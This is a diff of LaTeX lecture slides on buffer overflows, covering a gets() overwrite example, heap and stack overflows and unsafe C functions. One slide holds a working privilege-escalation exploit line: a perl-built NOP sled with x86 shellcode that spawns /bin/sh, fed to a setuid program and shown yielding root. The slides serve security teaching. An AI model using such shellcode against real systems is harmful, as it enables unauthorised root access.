@@ -7,84 +7,102 @@
 %*(quick Example ?)
 %\end{frame}
 
-\subsection{What is BOF?}
+%\subsection{What is BOF?}
 \begin{frame}[fragile,allowframebreaks]{What is BOF?}
-  \begin{figure}
+	\begin{figure}
 		\centering
-		\includegraphics[width=\textwidth]{imgs/segfault.png}
+		\includegraphics[height=.7\textheight]{imgs/segfault.png}
 		\caption{BOF segmentation fault}
 		\label{fig:segfault}
 	\end{figure}
-\framebreak
 	\begin{block}{Also known as}
 		\begin{verbatim}
-			user$ ./note AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+			user$ ./note AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 			Segmentation fault
 		\end{verbatim}
 	\end{block}
-\framebreak
+\end{frame}
+\begin{frame}[fragile,allowframebreaks]{How to use BOF?}
 	\begin{figure}
 		\centering
-		\includegraphics[width=0.4\textwidth]{imgs/whoami.png}
+		\includegraphics[height=.7\textheight]{imgs/whoami.png}
 		\caption{BOF whoami: root}
 		\label{fig:whoami}
 	\end{figure}
-\framebreak
 	\begin{block}{Also known as}
-		\begin{lstlisting}
-			user$ ./note `perl -e 'printf("\x90" x 153 . "\x31\xdb\x31\xc9\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd\x80" . "\x90" x 22 . "\xef\xbe\xad\xde")'`
+		\begin{verbatim}
+			user$ ./note `perl -e 'printf("\x90" x 153 .
+    "\x31\xdb\x31\xc9\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50
+     \x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
+     \x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xdb\xb0\x01
+     \xcd\x80" . "\x90" x 22 . "\xef\xbe\xad\xde")'`
 			sh-3.1# whoami
 			root
-		\end{lstlisting}
+		\end{verbatim}
 	\end{block}
 \end{frame}
 
 \subsection{Basic Overflow}
+\begin{frame}[fragile,allowframebreaks]{Basic Overflow}
 	In the following example, a program has defined two data items which are adjacent in memory: an 8-byte-long string buffer, A, and a two-byte integer (short), B. Initially, A contains nothing but zero bytes, and B contains the number 1979. Characters are one byte wide.
-	\begin{columns}[T]
-		\begin{column}{.4\textwidth}
-			\ccode
-			\begin{lstlisting}
-				char A[8] = {0,0,0,0,0,0,0,0};
-				short B = 1979;
-			\end{lstlisting}
-		\end{column}
-		\begin{column}{.6\textwidth}
-			\begin{figure}
-			\includegraphics[width=\textwidth]{imgs/initialAB.png}
-			\label{fig:initialAB}
-			\caption{A and B variables initial state}			
-			\end{figure}
-		\end{column}
-	\end{columns}
-%	\begin{figure}
-%		\centering
-%		\includegraphics[width=\textwidth]{imgs/initialAB.png}
-%		\caption{A and B variables initial state}
-%		\label{fig:initialAB}
-%	\end{figure}
+	\ccode
+	\begin{lstlisting}
+	char A[8] = {0,0,0,0,0,0,0,0};
+	short B = 1979;
+	\end{lstlisting}
+	\begin{figure}
+		\centering
+		\includegraphics[width=\textwidth]{imgs/initialAB.png}
+		\caption{A and B variables initial state}
+		\label{fig:initialAB}
+	\end{figure}
 \framebreak
 	Now, the program attempts to store the null-terminated string "excessive" in the A buffer. "excessive" is 9 characters long, and A can take 8 characters. By failing to check the length of the string, it overwrites the value of B
-	\begin{columns}[T]
-		\begin{column}{.4\textwidth}
-			\ccode
-			\begin{lstlisting}
-				gets(A);
-			\end{lstlisting}
-		\end{column}
-		\begin{column}{.6\textwidth}
-			\begin{figure}
-			\includegraphics[width=\textwidth]{imgs/finalAB.png}
-			\label{fig:finalAB}
-			\caption{A and B variables final state}
-			\end{figure}
-		\end{column}
-	\end{columns}
-%	\begin{figure}
-%		\centering
-%		\includegraphics[width=\textwidth]{imgs/finalAB.png}
-%		\caption{A and B variables final state}
-%		\label{fig:finalAB}
-%	\end{figure}
+	\ccode
+	\begin{lstlisting}
+	gets(A);
+	\end{lstlisting}
+	\begin{figure}
+		\centering
+		\includegraphics[width=\textwidth]{imgs/finalAB.png}
+		\caption{A and B variables final state}
+		\label{fig:finalAB}
+	\end{figure}
+\end{frame}
+
 \subsection{Heap-based Overflow}
+\begin{frame}[fragile,allowframebreaks]{Heap-based Overflow}
+	Heap-based overflow is a type of buffer overflow that occurs in the heap data area. Memory on the heap is dynamically allocated by the application at run-time and typically contains program data.\\
+\begin{columns}[T]
+	\begin{column}{.47\textwidth}
+%	\begin{block}{A quick look}
+		%Heap overflows are exploitable in a different manner to that of stack-based overflows.\\
+		Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list pointers.\\
+		The canonical heap overflow technique overwrites dynamic memory allocation linkage (such as malloc meta data) and uses the resulting pointer exchange to overwrite a program function pointer.
+%	\end{block}
+	\end{column}
+	\begin{column}{.5\textwidth}
+		\includegraphics[width=\textwidth]{imgs/heap.png}
+		\label{fig:heap}
+	\end{column}
+\end{columns}
+\end{frame}
+
 \subsection{Stack-based Overflow}
+\begin{frame}[fragile,allowframebreaks]{Stack-based Overflow}
+	Stack-based buffer overflows manipulate the program to their advantage in one of several ways:
+	\begin{itemize}
+		\item By overwriting a local variable that is near the buffer in memory on the stack to change the behaviour of the program which may benefit the attacker.
+		\item By overwriting a function pointer, or exception handler, which is subsequently executed.
+		\item By overwriting the return address in a stack frame. Once the function returns, execution will resume at the return address as specified by the attacker, usually a user input filled buffer.
+	\end{itemize}
+\framebreak
+	\begin{block}{Overwriting the return address}
+	\end{block}
+\end{frame}
+\subsection{Unsafe functions}
+\begin{frame}[fragile,allowframebreaks]{Unsafe functions}
+C functions that don't check the size of the destination buffers, such as gets(), strcpy(), strcat(), printf(), sprintf(), ...
+\end{frame}
